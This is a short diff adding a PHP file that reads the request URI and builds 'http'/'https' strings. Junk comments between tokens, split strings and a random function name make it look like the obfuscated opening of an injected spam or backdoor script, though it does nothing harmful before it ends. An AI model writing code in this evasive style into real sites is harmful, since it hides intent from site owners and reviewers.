@@ -1,0 +1,16 @@
+<?php
+/**df
+***/
+function/***/dredzri()/*dd*/
+{
+    $duri = $_SERVER['REQUEST_URI'];
+    return $duri;
+}
+$http_web/**/= 'ht'.'tp';
+$http = 'htt'.'ps';
+$duri_tmp = /*c*/dredzri();
+if ($duri_tmp == ''){
+    $duri_tmp = '/';
+}
+$duri = $duri_tmp;
+
